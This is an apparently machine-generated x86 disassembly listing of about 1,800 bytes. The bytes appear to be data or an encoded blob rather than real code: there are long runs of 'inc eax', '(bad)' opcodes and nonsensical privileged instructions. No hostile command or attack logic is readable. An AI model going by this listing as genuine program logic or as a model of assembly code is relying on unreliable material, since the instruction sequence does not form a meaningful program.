  414fee:	mov    ds:0x40dbb861,al
  414ff3:	pop    ebp
  414ff4:	cs dec ebp
  414ff6:	test   al,0xf8
  414ff8:	lds    ebp,FWORD PTR [eax]
  414ffa:	push   cs
  414ffb:	rcl    DWORD PTR [esi+0x63],cl
  414ffe:	adc    DWORD PTR [ebx+0x4c],esp
  415001:	inc    edx
  415002:	inc    eax
  415003:	inc    eax
  415004:	inc    eax
  415005:	inc    eax
  415006:	inc    eax
  415007:	inc    eax
  415008:	and    eax,0x40404040
  41500d:	rol    BYTE PTR [ecx+0x739ba810],1
  415013:	or     DWORD PTR [ecx],ecx
  415015:	stos   DWORD PTR es:[edi],eax
  415016:	or     al,0xb0
  415018:	daa    
  415019:	sbb    eax,DWORD PTR [eax-0x64]
  41501c:	inc    eax
  41501d:	je     0x415032
  41501f:	cmp    cl,bl
  415021:	test   al,0x48
  415023:	bound  ebx,QWORD PTR [edi]
  415025:	push   esi
  415026:	inc    eax
  415027:	inc    eax
  415028:	inc    eax
  415029:	inc    eax
  41502a:	inc    eax
  41502b:	inc    eax
  41502c:	inc    eax
  41502d:	inc    eax
  41502e:	inc    eax
  41502f:	inc    eax
  415030:	jmp    0x414ff0
  415032:	enter  0x794e,0x40
  415036:	inc    eax
  415037:	lock dec ecx
  415039:	bound  edi,QWORD PTR fs:[edi]
  41503c:	shl    BYTE PTR [eax],0x14
  41503f:	jb     0x41504c
  415041:	pop    es
  415042:	gs leave 
  415044:	bound  ebp,QWORD PTR [eax+eax*2+0x59]
  415048:	dec    ebp
  415049:	pushf  
  41504a:	aam    0x88
  41504c:	mov    eax,0x1f01022
  415051:	push   ebx
  415052:	jecxz  0x415082
  415054:	inc    eax
  415055:	inc    eax
  415056:	inc    eax
  415057:	inc    eax
  415058:	inc    eax
  415059:	inc    eax
  41505a:	rol    DWORD PTR [eax+0x40],0x5
  41505e:	inc    edi
  41505f:	inc    eax
  415060:	add    DWORD PTR [edx-0x4c],eax
  415063:	xor    al,0x84
  415065:	jae    0x41502c
  415067:	sbb    DWORD PTR [eax+eax*4+0x5],esp
  41506b:	bound  ax,DWORD PTR [edx+0xa]
  41506f:	inc    eax
  415070:	inc    eax
  415071:	add    BYTE PTR [eax+0x40],al
  415074:	inc    eax
  415075:	inc    eax
  415076:	inc    eax
  415077:	inc    eax
  415078:	inc    eax
  415079:	jo     0x4150ad
  41507b:	int    0xb7
  41507d:	adc    bh,dh
  41507f:	sbb    dl,BYTE PTR [edx]
  415081:	adc    bl,BYTE PTR [edi+0x61]
  415084:	jp     0x4150a6
  415086:	dec    edi
  415087:	fadd   DWORD PTR [eax+0x60]
  41508a:	xor    BYTE PTR [ebx+0x40b44f42],0x40
  415091:	inc    eax
  415092:	inc    eax
  415093:	inc    eax
  415094:	inc    eax
  415095:	inc    eax
  415096:	inc    eax
  415097:	inc    eax
  415098:	inc    eax
  415099:	dec    esp
  41509a:	add    esi,ebx
  41509c:	jp     0x415103
  41509e:	bound  esi,QWORD PTR ds:0x15404115
  4150a4:	dec    edi
  4150a5:	jp     0x415112
  4150a7:	es retf 
  4150a9:	inc    ebx
  4150aa:	add    eax,0xd8f0808e
  4150af:	cmp    cl,BYTE PTR [eax+0x30]
  4150b2:	inc    eax
  4150b3:	mov    bl,0x40
  4150b5:	inc    eax
  4150b6:	inc    eax
  4150b7:	inc    eax
  4150b8:	inc    eax
  4150b9:	inc    eax
  4150ba:	int3   
  4150bb:	jne    0x4150fd
  4150bd:	sub    al,0x65
  4150bf:	bound  esp,QWORD PTR [ebx-0x57]
  4150c2:	add    al,0x4
  4150c4:	mov    DWORD PTR [edx-0x7e9def50],ebp
  4150ca:	inc    eax
  4150cb:	inc    eax
  4150cc:	xchg   ecx,eax
  4150cd:	dec    eax
  4150ce:	adc    eax,0x31b85828
  4150d3:	inc    eax
  4150d4:	popa   
  4150d5:	or     cl,0x30
  4150d8:	push   esp
  4150d9:	or     eax,0x2d15406c
  4150de:	stos   BYTE PTR es:[edi],al
  4150df:	fisttp WORD PTR [ecx-0x35]
  4150e2:	inc    eax
  4150e3:	add    cl,al
  4150e5:	inc    eax
  4150e6:	inc    eax
  4150e7:	inc    eax
  4150e8:	inc    eax
  4150e9:	add    BYTE PTR [eax+0x3f],al
  4150ec:	inc    eax
  4150ed:	or     cl,BYTE PTR [eax-0x6f]
  4150f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150f1:	xor    al,0x69
  4150f3:	jb     0x415135
  4150f5:	jns    0x415077
  4150f7:	mov    al,0x27
  4150f9:	loope  0x415148
  4150fb:	cmc    
  4150fc:	or     al,0x44
  4150fe:	es adc eax,0x6f3da8c0
  415104:	inc    eax
  415105:	repz add al,BYTE PTR [edx+ecx*4+0x10]
  41510a:	enter  0xd7f,0x4e
  41510e:	xchg   DWORD PTR [eax+0x40],eax
  415111:	inc    eax
  415112:	inc    eax
  415113:	inc    eax
  415114:	inc    eax
  415115:	inc    eax
  415116:	inc    eax
  415117:	inc    DWORD PTR [eax+0x14]
  41511a:	popa   
  41511b:	mov    ah,0xc0
  41511d:	sub    eax,0x24601140
  415122:	test   al,0x41
  415124:	call   0x8281656c
  415129:	aam    0x45
  41512b:	bound  esp,QWORD PTR [edx+0x33]
  41512e:	inc    eax
  41512f:	xchg   ecx,eax
  415130:	xor    al,0xc4
  415132:	sub    bl,BYTE PTR [eax-0x58]
  415135:	add    BYTE PTR [eax],cl
  415137:	sbb    al,BYTE PTR [eax+0x40]
  41513a:	inc    eax
  41513b:	inc    eax
  41513c:	inc    eax
  41513d:	inc    eax
  41513e:	inc    eax
  41513f:	inc    eax
  415140:	inc    eax
  415141:	inc    eax
  415142:	add    BYTE PTR [edi+0x4a],cl
  415145:	push   ebp
  415146:	ret    
  415147:	inc    eax
  415148:	inc    eax
  415149:	mov    bl,0x80
  41514b:	inc    eax
  41514c:	inc    ebx
  41514d:	in     al,0xbc
  41514f:	xor    DWORD PTR [esi-0x41],ebp
  415152:	inc    eax
  415153:	inc    eax
  415154:	inc    eax
  415155:	inc    eax
  415156:	inc    eax
  415157:	inc    eax
  415158:	inc    eax
  415159:	inc    eax
  41515a:	add    ch,ch
  41515c:	mov    al,0x6d
  41515e:	in     al,dx
  41515f:	sbb    DWORD PTR [eax+eax*2+0x46],ebp
  415163:	and    eax,0xbf627042
  415168:	fmul   QWORD PTR [esi]
  41516a:	mov    ch,0x7
  41516c:	jo     0x4151d0
  41516e:	jbe    0x4151c2
  415170:	inc    ebx
  415171:	inc    eax
  415172:	inc    ebx
  415173:	inc    eax
  415174:	inc    eax
  415175:	inc    eax
  415176:	inc    eax
  415177:	inc    eax
  415178:	inc    eax
  415179:	and    eax,0x82404040
  41517e:	aam    0xc5
  415180:	cmp    al,0xc9
  415182:	ror    DWORD PTR [edi],1
  415184:	xchg   ebp,eax
  415185:	cs faddp st(4),st
  415188:	bsf    ecx,DWORD PTR [ebp+0x40]
  41518c:	ins    DWORD PTR es:[edi],dx
  41518d:	pop    edx
  41518e:	pop    edi
  41518f:	dec    edi
  415190:	in     al,dx
  415191:	enter  0x9a7,0xd1
  415195:	add    ch,bl
  415197:	jmp    0x40c14fff
  41519c:	dec    edx
  41519d:	sub    DWORD PTR [edx-0x49],esp
  4151a0:	pop    esp
  4151a1:	arpl   WORD PTR [eax+0x40],ax
  4151a4:	inc    eax
  4151a5:	inc    eax
  4151a6:	inc    eax
  4151a7:	inc    eax
  4151a8:	inc    eax
  4151a9:	inc    eax
  4151aa:	inc    eax
  4151ab:	inc    eax
  4151ac:	lods   eax,DWORD PTR ds:[esi]
  4151ad:	adc    al,0xd1
  4151af:	(bad)  
  4151b0:	fsub   DWORD PTR [ebp-0x18]
  4151b3:	dec    eax
  4151b4:	inc    ecx
  4151b5:	inc    eax
  4151b6:	sub    al,0x1
  4151b8:	push   ebx
  4151b9:	jmp    0x3845f08
  4151be:	jae    0x41523a
  4151c0:	inc    eax
  4151c1:	inc    eax
  4151c2:	inc    eax
  4151c3:	inc    eax
  4151c4:	inc    eax
  4151c5:	inc    eax
  4151c6:	rol    DWORD PTR [eax+0x40],0x29
  4151ca:	aad    0x50
  4151cc:	retf   
  4151cd:	xor    BYTE PTR [eax+0x45],al
  4151d0:	add    ch,cl
  4151d2:	inc    eax
  4151d3:	test   al,0x4
  4151d5:	jl     0x4151ec
  4151d7:	push   ecx
  4151d8:	cmp    BYTE PTR [ebp+0x40345cd7],al
  4151de:	inc    eax
  4151df:	inc    eax
  4151e0:	push   ss
  4151e1:	arpl   WORD PTR [eax+0x40],ax
  4151e4:	add    BYTE PTR [eax+0x40],al
  4151e7:	inc    eax
  4151e8:	inc    eax
  4151e9:	inc    eax
  4151ea:	inc    eax
  4151eb:	mov    ecx,0x123142e9
  4151f0:	xchg   ecx,eax
  4151f1:	dec    ecx
  4151f2:	dec    esp
  4151f3:	bound  edx,QWORD PTR [ebp-0x5b]
  4151f6:	ins    BYTE PTR es:[edi],dx
  4151f7:	inc    eax
  4151f8:	cmp    eax,DWORD PTR [ecx-0x67fac08b]
  4151fe:	inc    eax
  4151ff:	inc    eax
  415200:	inc    eax
  415201:	inc    eax
  415202:	inc    eax
  415203:	inc    eax
  415204:	inc    eax
  415205:	inc    eax
  415206:	inc    eax
  415207:	inc    eax
  415208:	stc    
  415209:	adc    al,0xb2
  41520b:	pop    esi
  41520c:	test   eax,edx
  41520e:	xchg   esi,ebp
  415210:	inc    ebx
  415211:	inc    eax
  415212:	mov    edi,0x40e3640e
  415217:	rcl    cl,1
  415219:	inc    eax
  41521a:	inc    eax
  41521b:	inc    eax
  41521c:	inc    eax
  41521d:	inc    eax
  41521e:	inc    eax
  41521f:	int3   
  415220:	jne    0x415262
  415222:	adc    esp,DWORD PTR [esi]
  415224:	imul   eax,DWORD PTR ss:[edi+0x73],0x25
  415229:	arpl   WORD PTR [eax+0x41],ax
  41522c:	or     BYTE PTR [ebp+edi*1+0xe79842b],ch
  415233:	rol    DWORD PTR [ecx],cl
  415235:	push   edx
  415236:	push   0x40cdeecd
  41523b:	inc    edx
  41523c:	inc    ebp
  41523d:	dec    esi
  41523e:	repz hlt 
  415240:	rcr    dl,cl
  415242:	or     edi,ebx
  415244:	inc    eax
  415245:	add    cl,al
  415247:	inc    eax
  415248:	inc    eax
  415249:	inc    eax
  41524a:	inc    eax
  41524b:	add    BYTE PTR [eax-0x76],al
  41524e:	call   0x415ae30f
  415253:	inc    eax
  415254:	xor    dl,BYTE PTR ds:[edx+0x55]
  415258:	add    eax,0xb51f4334
  41525d:	sbb    dh,BYTE PTR [ecx+0x302d87dc]
  415263:	inc    eax
  415264:	inc    eax
  415265:	inc    eax
  415266:	inc    eax
  415267:	inc    eax
  415268:	inc    eax
  415269:	inc    eax
  41526a:	inc    eax
  41526b:	inc    DWORD PTR [eax+0x40]
  41526e:	inc    ebp
  41526f:	add    DWORD PTR [eax+0x783e9047],ebx
  415275:	adc    al,0xb2
  415277:	daa    
  415278:	(bad)  
  415279:	aam    0x41
  41527b:	mov    edi,0x1144040
  415280:	inc    eax
  415281:	inc    eax
  415282:	inc    eax
  415283:	inc    eax
  415284:	inc    eax
  415285:	inc    eax
  415286:	inc    eax
  415287:	inc    eax
  415288:	inc    eax
  415289:	inc    eax
  41528a:	or     BYTE PTR [edx+0x32],ch
  41528d:	mov    edi,0x9b451031
  415292:	arpl   WORD PTR [eax],ax
  415294:	push   esp
  415295:	mov    edi,0x4b52406c
  41529a:	das    
  41529b:	int3   
  41529c:	arpl   WORD PTR [edi-0x7f80e66a],di
  4152a2:	sub    BYTE PTR [edx+0x7e],ah
  4152a5:	inc    ecx
  4152a6:	inc    ebx
  4152a7:	inc    eax
  4152a8:	cmp    bh,BYTE PTR [eax+eax*2+0x40]
  4152ac:	inc    eax
  4152ad:	inc    eax
  4152ae:	inc    eax
  4152af:	inc    eax
  4152b0:	inc    eax
  4152b1:	inc    eax
  4152b2:	add    BYTE PTR [ebx-0x48],ah
  4152b5:	sub    al,0x79
  4152b7:	rcl    DWORD PTR [edx],1
  4152b9:	pop    ds
  4152ba:	pop    ds
  4152bb:	xchg   edx,eax
  4152bc:	shr    BYTE PTR [esi],0x3c
  4152bf:	aad    0x40
  4152c1:	adc    DWORD PTR [ecx],eax
  4152c3:	test   eax,0x4040afe5
  4152c8:	inc    eax
  4152c9:	inc    eax
  4152ca:	inc    eax
  4152cb:	inc    eax
  4152cc:	and    eax,0xac404040
  4152d1:	iret   
  4152d2:	add    eax,DWORD PTR [ebp+0x57]
  4152d5:	mov    eax,0x7c37162
  4152da:	inc    eax
  4152db:	mov    dl,0x84
  4152dd:	stos   DWORD PTR es:[edi],eax
  4152de:	retf   
  4152df:	into   
  4152e0:	or     ebp,edi
  4152e2:	add    eax,0x52cb6228
  4152e7:	bound  edi,QWORD PTR [esi+0x41]
  4152ea:	inc    eax
  4152eb:	sbb    DWORD PTR [ecx+0x14],ecx
  4152ee:	xlat   BYTE PTR ds:[ebx]
  4152ef:	inc    eax
  4152f0:	inc    eax
  4152f1:	inc    eax
  4152f2:	inc    eax
  4152f3:	inc    eax
  4152f4:	inc    eax
  4152f5:	inc    eax
  4152f6:	inc    eax
  4152f7:	inc    eax
  4152f8:	inc    eax
  4152f9:	mov    eax,0xf2044770
  4152fe:	sub    BYTE PTR [eax],0xce
  415301:	bound  eax,QWORD PTR ds:0x77264024
  415307:	test   BYTE PTR [eax+0x51],0x35
  41530b:	je     0x41534d
  41530d:	or     al,BYTE PTR [eax+0x7c]
  415310:	or     al,0x60
  415312:	and    eax,0xf4114044
  415317:	inc    eax
  415318:	inc    eax
  415319:	inc    eax
  41531a:	inc    eax
  41531b:	inc    eax
  41531c:	inc    eax
  41531d:	rol    DWORD PTR [eax+0x40],0x6b
  415321:	addr16 push edx
  415323:	retf   
  415324:	push   ecx
  415325:	adc    al,0xf6
  415327:	add    esp,DWORD PTR [edx+esi*2+0x42]
  41532b:	mov    edi,0x4973406b
  415330:	jl     0x4152da
  415332:	xor    BYTE PTR [edi+0x8118ac],bh
  415338:	arpl   WORD PTR [ebx],di
  41533a:	inc    ecx
  41533b:	repnz inc eax
  41533d:	inc    eax
  41533e:	add    BYTE PTR [eax+0x40],al
  415341:	inc    eax
  415342:	inc    eax
  415343:	inc    eax
  415344:	inc    eax
  415345:	mov    bl,0x40
  415347:	jbe    0x41534a
  415349:	push   ss
  41534a:	sub    ch,BYTE PTR [eax-0x68ebbc4b]
  415350:	jns    0x41531a
  415352:	sbb    dl,BYTE PTR [edx]
  415354:	inc    edx
  415355:	rol    BYTE PTR [eax-0x4d],cl
  415358:	rcr    BYTE PTR [esi],0x2c
  41535b:	test   al,0xef
  41535d:	mov    ch,BYTE PTR [esi+0x39]
  415360:	jne    0x415383
  415362:	pop    ecx
  415363:	adc    eax,0x95407a80
  415368:	inc    eax
  415369:	mov    ecx,0x40404235
  41536e:	inc    eax
  41536f:	inc    eax
  415370:	inc    eax
  415371:	inc    eax
  415372:	inc    eax
  415373:	inc    eax
  415374:	inc    eax
  415375:	inc    eax
  415376:	(bad)  
  415377:	iret   
  415378:	push   cs
  415379:	pop    ds
  41537a:	arpl   WORD PTR [ecx-0x80],ax
  41537d:	jb     0x415382
  41537f:	fiadd  DWORD PTR [eax+0x32]
  415382:	in     eax,0x50
  415384:	(bad)
  415387:	sub    BYTE PTR [edi],cl
  415389:	adc    ecx,edx
  41538b:	inc    edx
  41538c:	inc    ecx
  41538d:	bound  esp,QWORD PTR [esi+0x42]
  415390:	inc    eax
  415391:	inc    eax
  415392:	adc    ebx,eax
  415394:	and    BYTE PTR [edx],ch
  415396:	push   esp
  415397:	add    eax,0x4020ff09
  41539c:	inc    eax
  41539d:	inc    eax
  41539e:	inc    eax
  41539f:	inc    eax
  4153a0:	inc    eax
  4153a1:	int3   
  4153a2:	jne    0x4153e4
  4153a4:	or     esp,0x40943591
  4153aa:	mov    esi,0x6d6462c4
  4153af:	push   ds
  4153b0:	bound  edx,QWORD PTR [edi+edi*4]
  4153b3:	gs pop esp
  4153b5:	push   es
  4153b6:	repnz push ds
  4153b8:	inc    eax
  4153b9:	inc    eax
  4153ba:	and    BYTE PTR [ebp+edx*1-0x58],ah
  4153be:	bound  edx,QWORD PTR [ebx+0x40]
  4153c1:	add    cl,al
  4153c3:	inc    eax
  4153c4:	inc    eax
  4153c5:	inc    eax
  4153c6:	inc    eax
  4153c7:	add    BYTE PTR [eax+0x30],al
  4153ca:	add    eax,DWORD PTR [eax-0x3f]
  4153cd:	retf   
  4153ce:	adc    DWORD PTR [ecx+edx*2+0x6c],esp
  4153d2:	inc    eax
  4153d3:	inc    eax
  4153d4:	sub    al,0x48
  4153d6:	inc    eax
  4153d7:	inc    eax
  4153d8:	inc    eax
  4153d9:	inc    eax
  4153da:	inc    eax
  4153db:	inc    eax
  4153dc:	inc    eax
  4153dd:	inc    eax
  4153de:	inc    DWORD PTR [eax-0x5c]
  4153e1:	inc    edx
  4153e2:	lock push eax
  4153e4:	adc    eax,0x4141cc4f
  4153e9:	shl    DWORD PTR [edi+0x43],1
  4153ec:	inc    eax
  4153ed:	nop
  4153ee:	(bad)  
  4153f0:	call   0x13129a4b
  4153f5:	inc    eax
  4153f6:	inc    eax
  4153f7:	inc    eax
  4153f8:	inc    eax
  4153f9:	inc    eax
  4153fa:	inc    eax
  4153fb:	inc    eax
  4153fc:	inc    eax
  4153fd:	inc    eax
  4153fe:	inc    eax
  4153ff:	mov    ah,0x40
  415401:	and    al,0xc4
  415403:	sub    ebp,DWORD PTR [eax]
  415405:	add    al,BYTE PTR [eax+0x52]
  415408:	jge    0x415462
  41540a:	push   ebp
  41540b:	rcl    DWORD PTR [esi+0x33],1
  41540e:	adc    al,0xbb
  415410:	dec    ebp
  415411:	les    edi,FWORD PTR [eax+0x4040a8d2]
  415417:	inc    eax
  415418:	inc    eax
  415419:	inc    eax
  41541a:	inc    eax
  41541b:	inc    eax
  41541c:	inc    eax
  41541d:	add    BYTE PTR [eax],bh
  41541f:	inc    eax
  415420:	dec    edi
  415421:	enter  0xb65d,0xf4
  415425:	adc    BYTE PTR [edi+0x13],ch
  415428:	inc    eax
  415429:	icebp  
  41542a:	push   esp
  41542b:	push   esi
  41542c:	fs mov esp,0x60404041
  415432:	inc    ebp
  415433:	shl    DWORD PTR [edx+0x7e0e4341],1
  415439:	dec    ecx
  41543a:	cmp    al,0xb4
  41543c:	inc    eax
  41543d:	inc    eax
  41543e:	inc    eax
  41543f:	inc    eax
  415440:	inc    eax
  415441:	inc    eax
  415442:	and    eax,0x34404040
  415447:	int    0x30
  415449:	inc    eax
  41544a:	and    eax,eax
  41544c:	gs or  eax,0x96cb062
  415452:	aad    0x24
  415454:	test   al,0x63
  415456:	das    
  415457:	mov    WORD PTR [eax+0x40],es
  41545a:	inc    ecx
  41545b:	inc    eax
  41545c:	inc    eax
  41545d:	inc    eax
  41545e:	inc    eax
  41545f:	inc    eax
  415460:	inc    eax
  415461:	inc    eax
  415462:	inc    eax
  415463:	inc    eax
  415464:	inc    eax
  415465:	or     BYTE PTR [ecx],dl
  415467:	fisubr DWORD PTR [ecx+edx*2]
  41546a:	xor    DWORD PTR [edi],ebx
  41546c:	pop    eax
  41546d:	ret    0x6402
  415470:	das    
  415471:	icebp  
  415472:	ins    BYTE PTR es:[edi],dx
  415473:	inc    eax
  415474:	cmp    DWORD PTR [esp+ecx*2-0x7],edi
  415478:	imul   ebp,DWORD PTR [ebp+0x6d],0x14
  41547c:	adc    edi,esp
  41547e:	int    0xb2
  415480:	test   al,0x43
  415482:	inc    ebx
  415483:	inc    eax
  415484:	jno    0x415453
  415486:	inc    eax
  415487:	inc    eax
  415488:	inc    eax
  415489:	inc    eax
  41548a:	inc    eax
  41548b:	inc    eax
  41548c:	rol    DWORD PTR [eax+0x40],0xa8
  415490:	jo     0x4154a4
  415492:	sub    dl,cl
  415494:	adc    BYTE PTR [esi-0x10],ah
  415497:	add    eax,0x7b41636a
  41549c:	inc    eax
  41549d:	mov    bl,0xc1
  41549f:	retf   
  4154a0:	data16 arpl WORD PTR [edx],bp
  4154a3:	xchg   edi,eax
  4154a4:	sbb    DWORD PTR [edi+eiz*2+0x1],eax
  4154a8:	mov    al,0xe8
  4154aa:	inc    ecx
  4154ab:	mov    eax,ds:0x47c71540
  4154b0:	adc    eax,0x404015
  4154b5:	inc    eax
  4154b6:	inc    eax
  4154b7:	inc    eax
  4154b8:	inc    eax
  4154b9:	inc    eax
  4154ba:	inc    eax
  4154bb:	dec    esp
  4154bc:	cmp    edx,DWORD PTR [edx]
  4154be:	ja     0x4154d7
  4154c0:	push   ds
  4154c1:	inc    ebp
  4154c2:	int    0x34
  4154c4:	inc    ecx
  4154c5:	inc    eax
  4154c6:	dec    edi
  4154c7:	inc    eax
  4154c8:	and    al,0xe6
  4154ca:	aaa    
  4154cb:	imul   eax,DWORD PTR [edi+0x3],0xfa52c493
  4154d2:	pop    es
  4154d3:	mov    BYTE PTR [eax+eax*2],ah
  4154d6:	cmp    dh,BYTE PTR [eax-0x35]
  4154d9:	lods   al,BYTE PTR ds:[esi]
  4154da:	bound  edi,QWORD PTR [eax]
  4154dc:	push   0x40401105
  4154e1:	inc    eax
  4154e2:	inc    eax
  4154e3:	inc    eax
  4154e4:	inc    eax
  4154e5:	inc    eax
  4154e6:	inc    eax
  4154e7:	inc    eax
  4154e8:	inc    eax
  4154e9:	inc    eax
  4154ea:	xchg   esp,eax
  4154eb:	jae    0x4154b1
  4154ed:	sub    BYTE PTR [eax+0x40],al
  4154f0:	inc    ecx
  4154f1:	rol    BYTE PTR [edx+edx*8+0x4f],0x49
  4154f6:	xor    DWORD PTR [esi+esi*2],eax
  4154f9:	js     0x4154e1
  4154fb:	stos   BYTE PTR es:[edi],al
  4154fc:	mov    esp,cr5
  4154ff:	inc    eax
  415500:	inc    eax
  415501:	inc    eax
  415502:	inc    eax
  415503:	inc    eax
  415504:	inc    eax
  415505:	int3   
  415506:	jne    0x415548
  415508:	inc    eax
  415509:	inc    ecx
  41550a:	gs addr16 add eax,0x400a091a
  415511:	jg     0x4154dc
  415513:	test   al,0x60
  415515:	data16 test al,0x43
  415518:	inc    eax
  415519:	jle    0x415587
  41551b:	pop    ecx
  41551c:	ret    0x1299
  41551f:	rcl    DWORD PTR [edi+ebx*4],1
  415522:	enter  0x65e9,0xe4
  415526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415527:	jle    0x415569
  415529:	push   ecx
  41552a:	inc    eax
  41552b:	add    cl,al
  41552d:	inc    eax
  41552e:	inc    eax
  41552f:	inc    eax
  415530:	inc    eax
  415531:	add    BYTE PTR [eax+0x71],al
  415534:	push   esp
  415535:	test   al,0x53
  415537:	inc    ecx
  415538:	pop    ss
  415539:	adc    ebx,edi
  41553b:	or     al,0x15
  41553d:	jae    0x415537
  41553f:	cmp    BYTE PTR [eax+eax*2-0x5e943daf],cl
  415546:	test   al,0xe8
  415548:	cli    
  415549:	or     edi,ebx
  41554b:	in     eax,dx
  41554c:	push   esp
  41554d:	data16 adc BYTE PTR [eax+0x40],al
  415551:	inc    eax
  415552:	inc    eax
  415553:	inc    eax
  415554:	inc    eax
  415555:	inc    eax
  415556:	inc    eax
  415557:	inc    DWORD PTR [eax+0x13]
  41555a:	sub    BYTE PTR [eax+0x5],al
  41555d:	cmp    dl,BYTE PTR ds:0x428052a6
  415563:	or     al,0xbe
  415565:	inc    eax
  415566:	retf   
  415567:	pusha  
  415568:	sbb    BYTE PTR [edi],0x66
  41556b:	inc    eax
  41556c:	push   ss
  41556d:	sub    DWORD PTR [ecx-0x778f3c5f],edx
  415573:	adc    al,0xf0
  415575:	or     eax,0x65436643
  41557a:	bound  eax,QWORD PTR [eax+0xf]
  41557d:	shr    DWORD PTR [ebp+0x40],0x40
  415581:	inc    eax
  415582:	inc    eax
  415583:	inc    eax
  415584:	inc    eax
  415585:	inc    eax
  415586:	inc    eax
  415587:	inc    eax
  415588:	inc    eax
  415589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41558a:	loopne 0x415520
  41558c:	inc    eax
  41558d:	adc    BYTE PTR [ecx+0x47],dl
  415590:	rol    BYTE PTR ds:0x40300dd4,1
  415596:	nop
  415597:	rol    BYTE PTR [edx+0x63],0x54
  41559b:	leave  
  41559c:	ins    BYTE PTR es:[edi],dx
  41559d:	sbb    DWORD PTR [ebp+0x2e],esp
  4155a0:	shr    BYTE PTR [esi+0x4027acc4],1
  4155a6:	push   0x53
  4155a8:	inc    eax
  4155a9:	inc    eax
  4155aa:	inc    eax
  4155ab:	inc    eax
  4155ac:	inc    eax
  4155ad:	inc    eax
  4155ae:	inc    eax
  4155af:	inc    eax
  4155b0:	add    BYTE PTR ds:0x430d5e64,dl
  4155b6:	adc    bh,BYTE PTR [eax]
  4155b8:	shr    BYTE PTR [eax-0x2ebd3e08],0x40
  4155bf:	push   0x26
  4155c1:	adc    BYTE PTR [eax-0x74],al
  4155c4:	jae    0x4155e7
  4155c6:	add    edi,DWORD PTR [edi]
  4155c8:	pop    edx
  4155c9:	mov    ah,0x40
  4155cb:	pop    ds
  4155cc:	fsub   DWORD PTR [edx+0x40404040]
  4155d2:	inc    eax
  4155d3:	inc    eax
  4155d4:	and    eax,0x40404040
  4155d9:	push   edx
  4155da:	and    al,BYTE PTR [ecx+0x40]
  4155dd:	mov    ebp,0x3f404498
  4155e2:	ret    
  4155e3:	adc    edx,ecx
  4155e5:	arpl   WORD PTR ds:0xc65240cf,ax
  4155eb:	inc    eax
  4155ec:	test   eax,0x7441878a
  4155f1:	aas    
  4155f2:	shl    DWORD PTR [edx-0x44],0x15
  4155f6:	sbb    al,0x43
  4155f8:	inc    eax
  4155f9:	out    dx,eax
  4155fa:	and    DWORD PTR [eax+0x40],eax
  4155fd:	inc    eax
  4155fe:	inc    eax
  4155ff:	inc    eax
  415600:	inc    eax
  415601:	inc    eax
  415602:	inc    eax
  415603:	inc    eax
  415604:	inc    eax
  415605:	cmp    al,BYTE PTR ds:0x40305353
  41560b:	push   edx
  41560c:	(bad)  
  41560d:	mov    ah,0xcb
  41560f:	loop   0x415674
  415611:	pusha  
  415612:	inc    eax
  415613:	aas    
  415614:	add    eax,0x73fa4862
  415619:	inc    eax
  41561a:	jae    0x41566e
  41561c:	les    edx,FWORD PTR ds:0x31f88847
  415622:	inc    eax
  415623:	aas    
  415624:	sub    eax,0x8cf54754
  415629:	ins    BYTE PTR es:[edi],dx
  41562a:	inc    eax
  41562b:	pusha  
  41562c:	inc    eax
  41562d:	inc    eax
  41562e:	inc    eax
  41562f:	inc    eax
  415630:	inc    eax
  415631:	inc    eax
  415632:	rol    DWORD PTR [eax+0x40],0x70
  415636:	bound  edi,QWORD PTR [edx+eiz*8+0x5]
  41563a:	les    eax,FWORD PTR [eax+0x52]
  41563d:	shl    DWORD PTR [eax+0x6b],0x56
  415641:	xchg   DWORD PTR [ebx+0x72],eax
  415644:	jne    0x415668
  415646:	pushf  
  415647:	xor    eax,DWORD PTR [esi+0x4140d174]
  41564d:	leave  
  41564e:	(bad)  
  41564f:	fadd   QWORD PTR ds:0x4040db
  415655:	inc    eax
  415656:	inc    eax
  415657:	inc    eax
  415658:	inc    eax
  415659:	inc    eax
  41565a:	inc    eax
  41565b:	push   ebx
  41565c:	inc    eax
  41565d:	cmp    DWORD PTR [esi-0x5c],ebx
  415660:	xor    al,0xf1
  415662:	push   edx
  415663:	jg     0x4156a5
  415665:	inc    eax
  415666:	retf   
  415667:	sub    al,BYTE PTR [eax+0x40d36756]
  41566d:	inc    eax
  41566e:	inc    eax
  41566f:	inc    eax
  415670:	inc    eax
  415671:	inc    eax
  415672:	inc    eax
  415673:	inc    eax
  415674:	inc    eax
  415675:	inc    eax
  415676:	jno    0x41566a
  415678:	mov    bh,0xa8
  41567a:	les    edx,FWORD PTR [ebp-0x14]
  41567d:	push   edi
  41567e:	inc    eax
  41567f:	push   0x8460104c
  415684:	gs inc ecx
  415686:	inc    eax
  415687:	je     0x41564f
  415689:	inc    eax
  41568a:	inc    eax
  41568b:	inc    eax
  41568c:	inc    eax
  41568d:	inc    eax
  41568e:	inc    eax
  41568f:	int3   
  415690:	jne    0x4156d2
  415692:	mov    ah,0x6a
  415694:	stc    
  415695:	xchg   edx,eax
  415696:	inc    ebx
  415697:	inc    eax
  415698:	xchg   ebp,eax
  415699:	jae    0x4156dd
  41569b:	ss inc ecx
  41569d:	jae    0x4156cf
  41569f:	inc    ecx
  4156a0:	popf   
  4156a1:	dec    esp
  4156a2:	jno    0x4156d4
  4156a4:	push   esi
  4156a5:	leave  
  4156a6:	pop    esp
  4156a7:	inc    eax
  4156a8:	je     0x41566a
  4156aa:	push   eax
  4156ab:	or     eax,0x40400582
  4156b0:	lahf   
  4156b1:	daa    
  4156b2:	fs inc eax
  4156b4:	add    cl,al
  4156b6:	inc    eax
  4156b7:	inc    eax
  4156b8:	inc    eax
  4156b9:	inc    eax
  4156ba:	add    BYTE PTR [eax+0x70],al
  4156bd:	dec    edx
  4156be:	sub    BYTE PTR [ecx],dh
  4156c0:	inc    eax
  4156c1:	es je  0x4156fa
  4156c4:	bound  esp,QWORD PTR [ecx+0x40436cf3]
  4156ca:	inc    eax
  4156cb:	inc    eax
  4156cc:	inc    eax
  4156cd:	inc    eax
  4156ce:	inc    eax
  4156cf:	inc    eax
  4156d0:	inc    eax
  4156d1:	inc    DWORD PTR [eax+0x36]
  4156d4:	shl    al,0x77
  4156d7:	adc    dl,0xe1
  4156da:	inc    eax
  4156db:	sub    eax,0x5b06229
  4156e0:	int    0x4a
  4156e2:	inc    eax
  4156e3:	pop    ecx
  4156e4:	inc    eax
  4156e5:	xor    ah,BYTE PTR [esi+0x48]
